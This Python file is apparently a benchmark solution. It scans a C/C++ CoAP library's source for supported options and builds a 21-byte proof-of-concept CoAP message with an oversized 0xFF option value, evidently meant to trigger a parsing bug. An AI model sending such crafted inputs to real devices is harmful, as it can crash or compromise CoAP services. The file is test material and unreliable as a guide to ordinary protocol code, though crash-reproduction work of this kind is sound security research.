import os
import re
import tarfile
import zipfile
import tempfile
import shutil
from typing import List, Tuple, Optional


def _extract_src(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path

    tmpdir = tempfile.mkdtemp(prefix="coap_src_")
    try:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        elif zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, "r") as zf:
                zf.extractall(tmpdir)
        else:
            return tmpdir

        entries = os.listdir(tmpdir)
        if len(entries) == 1:
            p = os.path.join(tmpdir, entries[0])
            if os.path.isdir(p):
                return p
        return tmpdir
    except Exception:
        return tmpdir


def _iter_text_files(root: str) -> List[str]:
    out = []
    for dp, _, fns in os.walk(root):
        for fn in fns:
            lfn = fn.lower()
            if lfn.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh")):
                out.append(os.path.join(dp, fn))
    return out


def _read_file(path: str) -> str:
    try:
        with open(path, "rb") as f:
            b = f.read()
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _source_contains_any(root: str, patterns: List[re.Pattern]) -> bool:
    for fp in _iter_text_files(root):
        s = _read_file(fp)
        if not s:
            continue
        for pat in patterns:
            if pat.search(s):
                return True
    return False


def _encode_coap_option(prev_num: int, opt_num: int, value: bytes) -> bytes:
    delta = opt_num - prev_num
    length = len(value)

    def enc_nibble(v: int) -> Tuple[int, bytes]:
        if v < 13:
            return v, b""
        if v < 269:
            return 13, bytes([v - 13])
        if v < 65805:
            x = v - 269
            return 14, bytes([(x >> 8) & 0xFF, x & 0xFF])
        return 14, b"\xFF\xFF"

    dn, de = enc_nibble(delta)
    ln, le = enc_nibble(length)
    first = bytes([(dn << 4) | ln])
    return first + de + le + value


def _build_coap_message(code: int, mid: int, token: bytes, options: List[Tuple[int, bytes]], payload: bytes = b"") -> bytes:
    tkl = len(token)
    if tkl > 8:
        token = token[:8]
        tkl = 8
    ver = 1
    typ = 0
    header0 = ((ver & 0x3) << 6) | ((typ & 0x3) << 4) | (tkl & 0xF)
    hdr = bytes([header0, code & 0xFF, (mid >> 8) & 0xFF, mid & 0xFF])

    opts = []
    prev = 0
    for num, val in sorted(options, key=lambda x: x[0]):
        opts.append(_encode_coap_option(prev, num, val))
        prev = num
    opt_bytes = b"".join(opts)

    if payload:
        return hdr + token + opt_bytes + b"\xFF" + payload
    return hdr + token + opt_bytes


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract_src(src_path)

        # Prefer Observe (6) if present; else fall back to Max-Age (14); else Content-Format (12)
        opt_num = 6
        try:
            if not _source_contains_any(root, [re.compile(r"\bOBSERVE\b", re.IGNORECASE), re.compile(r"COAP_OPTION_OBSERVE", re.IGNORECASE)]):
                if _source_contains_any(root, [re.compile(r"\bMAX[_-]?AGE\b", re.IGNORECASE), re.compile(r"COAP_OPTION_MAX_AGE", re.IGNORECASE)]):
                    opt_num = 14
                elif _source_contains_any(root, [re.compile(r"CONTENT[_-]?FORMAT", re.IGNORECASE), re.compile(r"COAP_OPTION_CONTENT_FORMAT", re.IGNORECASE)]):
                    opt_num = 12
        except Exception:
            opt_num = 6

        token = b"\x00" * 8
        val = b"\xFF" * 8
        poc = _build_coap_message(code=0x01, mid=0x0000, token=token, options=[(opt_num, val)], payload=b"")
        return poc[:21] if len(poc) >= 21 else poc + (b"\x00" * (21 - len(poc)))